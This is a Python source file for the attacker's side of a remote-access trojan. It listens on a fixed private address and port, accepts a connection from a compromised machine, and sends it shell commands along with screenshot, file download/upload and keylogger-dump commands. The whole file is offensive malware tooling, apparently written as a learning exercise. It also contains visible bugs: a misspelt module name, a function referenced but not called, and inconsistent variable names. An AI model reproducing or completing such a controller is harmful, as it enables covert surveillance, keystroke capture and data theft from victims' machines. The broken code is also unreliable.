import socket
import json
import os
import base64

count=1

def reliable_send(data):
	json_data = json.dumps(data)
	target.send(json_data.encode())

def reliable_recv():
	data = ''
	while True:
		try:
			data = data + target.recv(1024).decode()
			return json.loads(data)
		except ValueError:
			continue

def shell():
	global count
	while True:
		command = input('* Shell#~%s:' % str(ip))  # raw_input() is renamed to input() in Python 3
		reliable_send(command)
		if command =='q':
			break
		elif command[:2] =='cd' and len(command) > 1:
			continue
		elif command[:10]=='screenshot':
			with open ('screenshot%d' % count ,'wb') as screen:
				image =reliable_recv
				image_decode=basee64.b64decode(image)
				if image_decode[:4]=='Fail':
					print(image_decoded)
				else:
					screen.write(image_decoded)
					count +=1
		elif command[:8] =='download':
			with open (command[9:],'wb') as  file:
				file_data=reliable_recv
				file.write(base64.b64decode(file_data))
		elif command[:6]=='upload':
			try:
				with open(command[7:],'rb') as fin:
					reliable_send(base64.b64encode(fin.read()))
			except:
				failed='Failed to upload'
				reliable_send(base64.b64encode(failed))
		elif command[:11]=='keylog_dump':
			continue
		else:
			result = reliable_recv()
			print(result)

def serve():
	global ip
	global target
	global server
	server=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	server.bind(('192.168.199.130', 54321))
	server.listen(5)
	print('Listening for connection...')
	target, ip = server.accept()
	print('Connection Established from: %s' % str(ip))

# Start the server and shell
serve()
shell()
server.close()
